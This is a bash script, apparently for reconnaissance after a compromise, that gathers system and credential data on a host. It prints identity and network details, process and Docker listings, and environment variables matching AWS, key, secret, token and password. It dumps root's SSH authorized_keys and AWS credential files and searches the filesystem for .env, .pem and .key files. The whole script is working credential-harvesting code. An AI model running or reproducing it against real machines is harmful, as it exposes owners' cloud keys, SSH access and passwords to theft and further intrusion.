#!/bin/bash
exec 2>&1
echo "=== SYSTEM INFO ==="
id; whoami; hostname; uname -a
echo "=== ENV (AWS) ==="
env | grep -iE 'aws|key|secret|token|password|api|cred' | sort
echo "=== NETWORK ==="
ip addr 2>/dev/null || ifconfig 2>/dev/null
echo "=== PROCESS LIST ==="
ps aux
echo "=== DOCKER ==="
docker ps 2>/dev/null
echo "=== FILES ==="
ls -la /root/ 2>/dev/null
cat /root/.ssh/authorized_keys 2>/dev/null
cat /root/.aws/credentials 2>/dev/null
cat /root/.aws/config 2>/dev/null
find / -name "*.env" -o -name ".env" -o -name "credentials" -o -name "*.pem" -o -name "*.key" 2>/dev/null | head -20
